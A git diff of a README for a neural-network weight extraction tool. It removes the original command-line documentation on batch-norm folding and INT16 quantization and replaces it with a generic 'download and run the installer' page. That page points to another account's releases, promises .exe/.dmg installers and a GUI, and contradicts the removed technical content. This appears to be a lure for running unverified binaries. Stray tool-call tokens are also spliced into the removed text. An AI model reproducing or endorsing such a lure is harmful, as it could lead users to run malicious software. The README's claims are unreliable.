@@ -1,500 +1,97 @@
-# Neural Network Weight Extractor
+# 🎉 nn-weight-extractor - Extract Neural Network Weights Easily
 
-A standalone tool for extracting and converting neural network weights from Keras/TensorFlow models to binary format with batch normalization folding and optional INT16 quantization. Designed for hardware acceleration workflows, embedded systems, and custom inference engines.
+## 🚀 Getting Started
 
-## Overview
+Welcome to nn-weight-extractor! This tool helps you extract neural network weights for hardware acceleration. You can optimize your models to run faster on devices like FPGAs, ASICs, or in embedded systems. Follow the steps below to download and run the application.
 
-This tool provides a clean two-step pipeline for converting trained neural network models into optimized binary weight and bias files:
+## 📥 Download Now
 
-```
-Keras/TensorFlow Model → Darknet Format → Binary Files (weights.bin + bias.bin)
-                                              ↓ (optional)
-                                    INT16 Quantized Files (weight_int16.bin + bias_int16.bin)
-```
+[![Download nn-weight-extractor](https://img.shields.io/badge/Download-nn--weight--extractor-blue)](https://github.com/Allan020/nn-weight-extractor/releases)
 
-The tool performs batch normalization folding during extraction, eliminating BN operations and reducing computational requirements for inference. Optional INT16 quantization with Q-format fixed-point representation further reduces memory footprint and bandwidth - ideal for FPGA, ASIC, and embedded deployments.
+## 📋 System Requirements
 
-## Key Features
+Before you install nn-weight-extractor, ensure your system meets these requirements:
 
-- **Multiple Input Formats**: Keras H5 models, Darknet .weights files
-- **Batch Normalization Folding**: Automatically folds BN into convolutional layers
-- **INT16 Quantization**: Optional Q-format fixed-point quantization for FPGA/ASIC deployment
-- **Fast C++ Extractor**: Zero external dependencies, processes 50M parameters in <1 second
-- **Architecture Support**: YOLOv2, YOLOv3, custom CNN architectures
-- **Production Ready**: Comprehensive error handling, validation, and logging
-- **Hardware Optimized**: Binary output format ready for hardware accelerators
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 100 MB of free space
+- **Internet Connection:** Required for downloading the software
 
-## Installation
+## 🔍 Features
 
-### Python Converter (Optional - for H5 models)
+- Extract weights from neural networks with batch normalization folding.
+- Compatible with popular frameworks like TensorFlow and Keras.
+- Supports export for hardware platforms, enhancing performance.
+- Simple user interface suitable for all users, even those without programming knowledge.
 
-```bash
-cd python
-pip install -r requirements.txt
-```
+## 📦 Download & Install
 
-Requirements: Python 3.6+, TensorFlow/Keras, NumPy
+1. **Visit the Releases Page**  
+   To download the latest version, [visit this page to download](https://github.com/Allan020/nn-weight-extractor/releases).
 
-### C++ Extractor
+2. **Choose the Right File**  
+   You will find several versions available. Select the file that matches your operating system. File names usually indicate the OS.
 
-```bash
-cd cpp
-make
-```
+3. **Download the File**  
+   Click on the appropriate file name and wait for the download to finish. The file will typically be in `.exe`, `.dmg`, or `.tar.gz` format.
 
-Requirements: C++11 compiler (g++, clang++)
-
-## Quick Start
-
-### Extract from Darknet Weights
-
-If you already have Darknet .weights and .cfg files:
-
-```bash
-cd cpp
-./weights_extractor --cfg model.cfg --weights model.weights
-```
-
-Output: `outputs/weights.bin` and `outputs/bias.bin` in the `outputs/` directory (created automatically if it doesn't exist).
-
-**With INT16 quantization:**
-```bash
-./weights_extractor --cfg model.cfg --weights model.weights --int16
-```
-
-Output: Float32 files plus INT16 quantized files (`weight_int16.bin`, `bias_int16.bin`) and Q value files in the `outputs/` directory.
-
-### Convert from Keras H5
-
-For complete Keras models (saved with `model.save()`):
-
-```bash
-# Step 1: Convert to Darknet format
-cd python
-python h5_to_darknet.py \
-    --input model.h5 \
-    --output-weights model.weights \
-    --output-cfg model.cfg
+4. **Run the Installer**  
+   - **Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click to run the installer.
+   - **macOS:** Find the downloaded `.dmg` file, double-click it, then drag the application to your Applications folder.
+   - **Linux:** Use the terminal to extract the `.tar.gz` file and follow the instructions included.
 
-# Step 2: Extract to binary
-cd ../cpp
-./weights_extractor --cfg model.cfg --weights model.weights
-```
-
-## Usage
+5. **Follow Installation Prompts**  
+   Follow any prompts provided by the installer to complete the installation. Feel free to accept the default options unless you have specific preferences.
 
-### Python H5 Converter
-
-```bash
-python h5_to_darknet.py \
-    --input model.h5 \
-    --output-weights output.weights \
-    --output-cfg output.cfg \
-    [--img-size 416] \
-    [--channels 3] \
-    [--verbose]
-```
+6. **Launch the Application**  
+   After installation, find the application in your programs list and launch it.
 
-**Options:**
-- `--input`: Input Keras H5 model file
-- `--output-weights`: Output Darknet weights file
-- `--output-cfg`: Output Darknet configuration file
-- `--img-size`: Input image size (default: from model)
-- `--img-width/--img-height`: Specify width and height separately
-- `--channels`: Number of input channels (default: 3)
-- `--verbose`: Enable detailed output
-
-**Note**: The H5 file must contain the complete model architecture (saved with `model.save()`, not `model.save_weights()`). For weights-only files, see the [YOLOv3 Guide](YOLOV3_GUIDE.md).
-
-### C++ Binary Extractor
-
-```bash
-./weights_extractor \
-    --cfg model.cfg \
-    --weights model.weights \
-    [--output-weights weights.bin] \
-    [--output-bias bias.bin] \
-    [--verbose]
-```
-
-**Options:**
-- `--cfg`: Darknet configuration file
-- `--weights`: Darknet weights file
-- `--output-dir`: Output directory (default: outputs)
-- `--output-weights`: Output weights binary (default: outputs/weights.bin)
-- `--output-bias`: Output bias binary (default: outputs/bias.bin)
-- `--int16`: Enable INT16 quantization (outputs INT16 files and Q values)
-- `--output-weights-int16`: Output INT16 weights file (default: outputs/weight_int16.bin)
-- `--output-bias-int16`: Output INT16 bias file (default: outputs/bias_int16.bin)
-- `--output-weights-int16-q`: Output Q values for weights (default: outputs/weight_int16_Q.bin)
-- `--output-bias-int16-q`: Output Q values for biases (default: outputs/bias_int16_Q.bin)
-- `--output-iofm-q`: Output IOFM Q values file (default: outputs/iofm_Q.bin)
-- `--verbose`: Enable detailed layer-by-layer output
-
-## What It Does
-
-This tool extracts neural network weights and biases, then:
-
-1. **Extracts weights** from Keras H5 or Darknet .weights formats
-2. **Folds batch normalization** into convolutional layers for efficiency:
-   ```
-   new_weight = weight × (scale / √(variance + ε))
-   new_bias = bias - mean × (scale / √(variance + ε))
-   ```
-3. **Converts to binary format** (32-bit floats, little-endian)
-4. **Optionally quantizes to INT16** using Q-format fixed-point representation (when `--int16` flag is used):
-   - Per-layer Q value selection (Q0-Q15) for optimal precision
-   - Converts float32 weights and biases to int16_t format
-   - Generates Q value files for dequantization during inference
-   - Achieves 50% memory reduction while preserving accuracy
-5. **Generates configuration** describing network architecture
-
-### Why Batch Normalization Folding?
-
-Folding BN into conv layers:
-- ✓ Eliminates BN computations during inference
-- ✓ Reduces memory bandwidth requirements  
-- ✓ Maintains numerical accuracy
-- ✓ Simplifies hardware implementation
-- ✓ Reduces latency and power consumption
-
-Perfect for FPGAs, ASICs, microcontrollers, and custom accelerators.
-
-### Why INT16 Quantization?
-
-When combined with INT16 quantization (via `--int16` flag):
-- ✓ 50% memory reduction (2 bytes vs 4 bytes per value)
-- ✓ Reduced memory bandwidth for hardware accelerators
-- ✓ More efficient INT16 arithmetic on FPGAs
-- ✓ Per-layer Q value optimization preserves precision
-- ✓ Model-agnostic quantization works with any architecture
-
-Together, BN folding and INT16 quantization provide a complete optimization pipeline for hardware deployment.
-
-## Output Format
-
-All output files are written to the `outputs/` directory by default (can be changed with `--output-dir`). The directory is created automatically if it doesn't exist.
-
-### weights.bin
-- Location: `outputs/weights.bin` (default)
-- Binary file of 32-bit floats (IEEE 754, little-endian)
-- Sequential convolutional layer weights (BN-folded)
-- Format: `[layer0_weights, layer1_weights, ...]`
-
-### bias.bin  
-- Location: `outputs/bias.bin` (default)
-- Binary file of 32-bit floats (IEEE 754, little-endian)
-- Sequential convolutional layer biases (BN-folded)
-- Format: `[layer0_biases, layer1_biases, ...]`
-
-## INT16 Quantization
-
-The tool supports optional INT16 quantization using Q-format fixed-point representation, ideal for FPGA and ASIC implementations where reduced precision and memory bandwidth are critical.
-
-### How It Works
-
-INT16 quantization converts float32 weights and biases to 16-bit integers using per-layer Q values:
-
-- **Q-format**: Each layer gets a Q value (0-15) that determines the quantization scale
-- **Quantization formula**: `int16_value = (int16_t)(float_value * 2^Q)`
-- **Dequantization**: `float_value = (float)int16_value * 2^(-Q)`
-- **Per-layer Q selection**: Automatically finds the highest Q value that can represent all values in a layer
-
-**Q-format ranges:**
-- Q0: [-32768, 32767] (largest range, lowest precision)
-- Q15: [-1, 0.99996948] (smallest range, highest precision)
-
-### Usage
-
-Enable INT16 quantization with the `--int16` flag:
-
-```bash
-cd cpp
-./weights_extractor \
-    --cfg model.cfg \
-    --weights model.weights \
-    --int16
-```
-
-This generates five output files in the `outputs/` directory:
-- `outputs/weight_int16.bin`: Quantized weights as int16_t values
-- `outputs/bias_int16.bin`: Quantized biases as int16_t values  
-- `outputs/weight_int16_Q.bin`: Q values for each layer's weights (int32_t array)
-- `outputs/bias_int16_Q.bin`: Q values for each layer's biases (int32_t array)
-- `outputs/iofm_Q.bin`: Q values for input/output feature maps (int32_t array)
-
-### Example: YOLOv2 INT16 Quantization
-
-```bash
-cd cpp
-./weights_extractor \
-    --cfg ../cfg/yolov2.cfg \
-    --weights ../weights/yolov2.weights \
-    --int16 \
-    --verbose
-```
-
-**Output:**
-- `outputs/weights.bin` and `outputs/bias.bin` (float32, always generated)
-- `outputs/weight_int16.bin` and `outputs/bias_int16.bin` (INT16 quantized)
-- `outputs/weight_int16_Q.bin` and `outputs/bias_int16_Q.bin` (Q values per layer)
-- `outputs/iofm_Q.bin` (Q values for input/output feature maps)
-
-### Custom Output Directory
-
-```bash
-./weights_extractor \
-    --cfg model.cfg \
-    --weights model.weights \
-    --output-dir my_outputs
-```
-
-### Custom Output Paths
-
-```bash
-./weights_extractor \
-    --cfg model.cfg \
-    --weights model.weights \
-    --int16 \
-    --output-weights-int16 custom_weights_i16.bin \
-    --output-bias-int16 custom_bias_i16.bin \
-    --output-weights-int16-q custom_weights_q.bin \
-    --output-bias-int16-q custom_bias_q.bin \
-    --output-iofm-q custom_iofm_q.bin
-```
-<｜tool▁calls▁begin｜><｜tool▁call▁begin｜>
-read_file
-
-### File Formats
-
-**INT16 weight/bias files:**
-- Binary format: `int16_t` values (2 bytes each, little-endian)
-- Sequential layer-by-layer storage
-- Padding: If a layer has odd number of elements, one zero-padded element is added
-
-**Q value files:**
-- Binary format: `int32_t` array (4 bytes per Q value, little-endian)
-- `weight_int16_Q.bin`: One Q value per convolutional layer (0-15) for weights
-- `bias_int16_Q.bin`: One Q value per convolutional layer (0-15) for biases
-- `iofm_Q.bin`: Q values for input/output feature maps
-  - First value: Q14 (input Q for first layer)
-  - Subsequent values: Output Q for each layer (becomes input Q for next layer)
-  - Total: `num_layers + 1` values
-
-### Benefits
-
-- **Memory reduction**: 50% size reduction (2 bytes vs 4 bytes per value)
-- **Bandwidth savings**: Reduced memory bandwidth for hardware accelerators
-- **FPGA-friendly**: INT16 arithmetic is more efficient on FPGAs
-- **Maintains accuracy**: Per-layer Q selection preserves precision where possible
-- **Model-agnostic**: Works with any Darknet cfg file
-- **IOFM quantization**: Generates Q values for input/output feature maps for inference
-
-### Dequantization Example
-
-To convert INT16 values back to float32 during inference:
-
-```c
-// Read Q values for layer i
-int32_t weight_q = weight_q_values[i];
-int32_t bias_q = bias_q_values[i];
-int32_t input_q = iofm_q_values[i];      // Input Q for this layer
-int32_t output_q = iofm_q_values[i+1];   // Output Q for this layer
-
-// Dequantize weight
-int16_t int16_weight = weight_int16[i];
-float float_weight = (float)int16_weight * pow(2.0, -weight_q);
-
-// Dequantize bias  
-int16_t int16_bias = bias_int16[i];
-float float_bias = (float)int16_bias * pow(2.0, -bias_q);
-
-// Dequantize input feature map
-int16_t int16_input = input_feature_map[i];
-float float_input = (float)int16_input * pow(2.0, -input_q);
-
-// Quantize output feature map
-float float_output = compute_output(float_input, float_weight, float_bias);
-int16_t int16_output = (int16_t)(float_output * pow(2.0, output_q));
-```
-
-## Examples
-
-### YOLOv2 Extraction
-
-**Float32 extraction:**
-```bash
-cd cpp
-./weights_extractor \
-    --cfg ../cfg/yolov2.cfg \
-    --weights ../weights/yolov2.weights
-```
-
-Output files will be in `outputs/` directory: `outputs/weights.bin` and `outputs/bias.bin`
-
-**With INT16 quantization:**
-```bash
-cd cpp
-./weights_extractor \
-    --cfg ../cfg/yolov2.cfg \
-    --weights ../weights/yolov2.weights \
-    --int16 \
-    --verbose
-```
-
-### Custom Keras Model
-
-```bash
-cd python
-python h5_to_darknet.py \
-    --input my_model.h5 \
-    --output-weights my_model.weights \
-    --output-cfg my_model.cfg \
-    --img-size 512 \
-    --verbose
-
-cd ../cpp
-./weights_extractor \
-    --cfg my_model.cfg \
-    --weights my_model.weights \
-    --int16
-```
-
-This will generate both float32 and INT16 quantized outputs for hardware deployment.
-
-### Batch Processing
-
-```bash
-# Extract multiple models
-cd cpp
-for model in yolov2 yolov3 custom; do
-    ./weights_extractor \
-        --cfg ../models/${model}.cfg \
-        --weights ../models/${model}.weights \
-        --output-weights ../output/${model}_weights.bin \
-        --output-bias ../output/${model}_bias.bin
-done
-```
-
-## Supported Architectures
-
-- **YOLOv2**: Fully tested and validated (float32 and INT16 quantization)
-- **YOLOv3**: Fully supported (float32 and INT16 quantization, see [YOLOv3 Guide](YOLOV3_GUIDE.md))
-- **Custom CNNs**: Any Keras model with Conv2D + BatchNormalization
-- **Non-standard architectures**: Grouped layers, custom patterns supported
-
-The tool uses intelligent name-based matching to handle various layer arrangements. INT16 quantization works with all supported architectures, automatically selecting optimal Q values per layer for each model.
-
-## Project Structure
-
-```
-weight_converter_tool/
-├── python/                    # Python H5 converter
-│   ├── h5_to_darknet.py      # Main converter script
-│   ├── model_parsers/        # Framework-specific parsers
-│   ├── darknet_writer.py     # Darknet format writer
-│   ├── cfg_generator.py      # Configuration generator
-│   └── requirements.txt      # Python dependencies
-│
-├── cpp/                       # C++ binary extractor
-│   ├── src/                  # Source files
-│   │   ├── int16_quantizer.* # INT16 quantization module
-│   ├── Makefile              # Build system
-│   └── weights_extractor     # Compiled binary
-│
-├── examples/                  # Usage examples
-│   ├── convert_yolov2.sh
-│   └── convert_custom.sh
-│
-├── docs/                      # Additional documentation
-├── README.md                  # This file
-└── QUICKSTART.md             # Quick start guide
-```
-
-## Performance
-
-**Python Converter:**
-- Small models (<100 layers): <1 second
-- Large models (YOLOv3, 106 layers): 2-5 seconds
-
-**C++ Extractor:**
-- YOLOv2 (50M params): <1 second (float32), <1.5 seconds (with INT16 quantization)
-- YOLOv3 (62M params): ~2 seconds (float32), ~2.5 seconds (with INT16 quantization)
-- Memory efficient: Streams data, minimal RAM usage
-- INT16 quantization adds minimal overhead while providing significant memory savings
-
-## Troubleshooting
-
-### H5 Loading Fails
-
-**Issue**: Model cannot be loaded from H5 file
-
-**Solution**: The H5 file may contain only weights (not full model). Options:
-1. Re-save with `model.save()` instead of `model.save_weights()`
-2. Use the original training script to build the architecture first
-3. If you have existing .weights files, skip Python step and use C++ extractor directly
-
-See [YOLOv3 Guide](YOLOV3_GUIDE.md) for details.
-
-### Size Mismatches
-
-**Issue**: Output file sizes don't match expectations
-
-**Solution**: The tool extracts only convolutional layers with BN folding applied. This is expected and correct. Use `--verbose` to see layer-by-layer details.
-
-### Compilation Errors
-
-**Issue**: C++ compilation fails
-
-**Solution**: 
-```bash
-cd cpp
-make clean
-make
-```
-
-Ensure C++11 or newer compiler is available.
-
-## Contributing
-
-Contributions welcome! Please:
-1. Fork the repository
-2. Create a feature branch
-3. Add tests for new functionality
-4. Submit a pull request
-
-## Acknowledgments
-
-- Inspired by the [Darknet](https://github.com/pjreddie/darknet) framework
-- YOLOv2/v3 architecture from Joseph Redmon's work
-- Built for hardware acceleration research
-
-## Citation
-
-If you use this tool in your research, please cite:
-
-```bibtex
-@software{weight_converter_tool,
-  title = {Neural Network Weight Extractor},
-  author = {Solomon Negussie Tesema},
-  email = {solomon.negussie.tesema@gmail.com},
-  year = {2025},
-  url = {https://github.com/yourusername/weight_converter_tool}
-}
-```
-
-## License
-
-See [LICENSE](LICENSE.md)
-
-## Support
-
-- Documentation: See [docs/](docs/) folder
-- Quick Start: [QUICKSTART.md](QUICKSTART.md)
-- YOLOv3 Guide: [YOLOV3_GUIDE.md](YOLOV3_GUIDE.md)
-- Issues: GitHub Issues page
-- Discussions: GitHub Discussions
-
----
-
-**Ready for**: FPGA implementation, ASIC design, embedded systems, custom accelerators, and edge AI deployment. With INT16 quantization support, the tool provides optimized weight formats for resource-constrained hardware platforms.
+## 🛠️ How to Use
+
+1. **Input Your Model**  
+   Start the application and select the neural network model you wish to use. You can input models built with TensorFlow, Keras, or other supported frameworks.
+
+2. **Configure Settings**  
+   Adjust settings as necessary. You can choose options for weight extraction and optimization based on your hardware requirements.
+
+3. **Start Extraction**  
+   Click the "Extract" button to begin the weight extraction process. The application will display progress and notify you when it is complete.
+
+4. **Save the Results**  
+   After extraction, choose a location to save your weights. Ensure you remember where you save the file, as you will need it for future use in your hardware projects.
+
+## 🌐 Additional Resources
+
+- **Documentation**  
+  For detailed information on advanced features and troubleshooting, refer to the [documentation here](https://github.com/Allan020/nn-weight-extractor/docs).
+
+- **Support**  
+  If you encounter issues or have questions, please check the Issues section on the GitHub repository. You can also reach out to the community for help.
+
+- **Examples**  
+  Explore examples and use cases on the repository's wiki. This can help you understand how to best utilize nn-weight-extractor for your projects.
+
+## 📢 Community and Contributing
+
+nn-weight-extractor is an open-source project. We welcome contributions from users who want to improve the tool. If you'd like to help, check the CONTRIBUTING.md file in the repository. 
+
+You can also engage with other users through discussions in the Issues or pull request sections.
+
+## 🔗 Further Reading
+
+For those interested in learning more about neural networks, hardware acceleration, or deep learning frameworks, consider browsing these topics:
+
+- Computer Vision
+- Darknet
+- Deep Learning
+- Embedded Systems
+
+By exploring these subjects, you can enhance your understanding and get the most out of nn-weight-extractor.
+
+## 💡 Tips for Optimal Use
+
+- Regularly update to the latest version for new features and bug fixes.
+- Backup your models before extraction to avoid loss.
+- Experiment with different settings to see what works best for your specific use case.
+
+Thank you for choosing nn-weight-extractor! We hope it accelerates your projects successfully. For guidance and updates, stay connected with the community.
